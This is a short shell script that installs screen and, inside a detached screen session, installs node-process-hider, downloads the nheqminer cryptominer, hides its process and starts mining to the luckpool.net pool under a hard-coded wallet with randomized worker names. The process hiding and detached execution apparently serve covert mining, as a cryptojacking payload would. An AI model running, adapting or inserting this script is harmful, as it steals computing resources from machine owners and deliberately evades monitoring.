cd
apt install -y screen < "/dev/null"
mkdir yoho
cd yoho

screen -S "mylittlescreen" -d -m
screen -r "mylittlescreen" -X stuff $'apt-get update && apt-get install libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer && ph add nheqminer && ./nheqminer -v -l na.luckpool.net:3956 -u RDxAbfB1LbAXN719DaCXSU41yvpKag7U5Z.$(shuf -i 1-99999 -n 1) -p x -t 8\n'
